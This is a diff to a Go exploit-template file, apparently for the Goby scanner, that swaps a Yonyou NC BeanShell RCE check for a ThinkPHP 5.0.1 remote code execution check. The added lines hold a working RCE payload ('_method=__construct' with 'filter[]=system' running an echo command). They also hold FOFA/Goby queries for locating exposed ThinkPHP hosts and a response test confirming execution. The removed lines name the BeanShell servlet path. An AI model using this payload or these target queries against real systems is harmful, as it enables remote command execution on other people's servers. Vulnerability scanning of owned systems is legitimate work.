@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "ThinkPHP 5.0.1 Remote Code Execution",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"ThinkPHP\" || product=\"ThinkPHP\"",
+  "GobyQuery": "app=\"ThinkPHP\" || product=\"ThinkPHP\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,11 +30,11 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/?s=index/index/index",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
-        "data": ""
+        "data": "s=echo%20echo aslkgjlskgjslkjhgsljweo&_method=__construct&method&filter[]=system"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "echo aslkgjlskgjslkjhgsljweo",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "ThinkPHP 5.0.1 Remote Code Execution",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "ThinkPHP 5.0.1 Remote Code Execution",
       "Product": "",
       "Description": "",
       "Recommendation": "",
